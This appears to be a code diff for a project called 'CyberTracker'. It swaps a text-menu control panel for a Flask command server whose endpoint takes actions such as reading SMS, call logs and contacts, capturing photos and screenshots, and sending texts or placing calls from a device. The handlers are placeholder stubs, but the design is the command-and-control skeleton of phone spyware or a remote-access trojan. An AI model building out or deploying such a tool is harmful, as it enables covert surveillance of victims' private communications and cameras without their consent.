@@ -1,52 +1,44 @@
-import requests
+from flask import Flask, request, jsonify
 
-SERVER_URL = "http://127.0.0.1:5000"  # Replace with your hosted Flask server URL
+app = Flask(__name__)
 
-def send_command(action, params={}):
-    url = f"{SERVER_URL}/send_command"
-    data = {"action": action, "params": params}
-    response = requests.post(url, json=data)
-    print(response.json())
+@app.route("/")
+def home():
+    return "CyberTracker API is Running!"
 
-while True:
-    print("\nCyberTracker Control Panel")
-    print("1. Fetch Device Info")
-    print("2. View SMS Logs")
-    print("3. View Call Logs")
-    print("4. View Contacts")
-    print("5. View Notifications")
-    print("6. Capture Photo")
-    print("7. Take Screenshot")
-    print("8. Send SMS")
-    print("9. Make Call")
-    print("10. Change Wallpaper")
-    print("11. Exit")
+@app.route("/send_command", methods=["POST"])
+def send_command():
+    data = request.get_json()
+    action = data.get("action")
+    params = data.get("params", {})
 
-    choice = input("Enter choice: ")
+    # Handle Different Actions
+    if action == "fetch_device_info":
+        return jsonify({"status": "success", "data": "Device Info Data"})
+    elif action == "fetch_sms_logs":
+        return jsonify({"status": "success", "data": "SMS Logs Data"})
+    elif action == "fetch_call_logs":
+        return jsonify({"status": "success", "data": "Call Logs Data"})
+    elif action == "fetch_contacts":
+        return jsonify({"status": "success", "data": "Contacts Data"})
+    elif action == "fetch_notifications":
+        return jsonify({"status": "success", "data": "Notifications Data"})
+    elif action == "capture_photo":
+        return jsonify({"status": "success", "message": "Photo Captured"})
+    elif action == "take_screenshot":
+        return jsonify({"status": "success", "message": "Screenshot Taken"})
+    elif action == "send_sms":
+        number = params.get("number")
+        message = params.get("message")
+        return jsonify({"status": "success", "message": f"SMS sent to {number}: {message}"})
+    elif action == "make_call":
+        number = params.get("number")
+        return jsonify({"status": "success", "message": f"Calling {number}"})
+    elif action == "change_wallpaper":
+        url = params.get("url")
+        return jsonify({"status": "success", "message": f"Wallpaper changed to {url}"})
+    else:
+        return jsonify({"status": "error", "message": "Invalid command"})
 
-    if choice == "1":
-        send_command("fetch_device_info")
-    elif choice == "2":
-        send_command("fetch_sms_logs")
-    elif choice == "3":
-        send_command("fetch_call_logs")
-    elif choice == "4":
-        send_command("fetch_contacts")
-    elif choice == "5":
-        send_command("fetch_notifications")
-    elif choice == "6":
-        send_command("capture_photo")
-    elif choice == "7":
-        send_command("take_screenshot")
-    elif choice == "8":
-        number = input("Enter Phone Number: ")
-        message = input("Enter Message: ")
-        send_command("send_sms", {"number": number, "message": message})
-    elif choice == "9":
-        number = input("Enter Phone Number: ")
-        send_command("make_call", {"number": number})
-    elif choice == "10":
-        image_url = input("Enter Image URL: ")
-        send_command("change_wallpaper", {"url": image_url})
-    elif choice == "11":
-        break
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
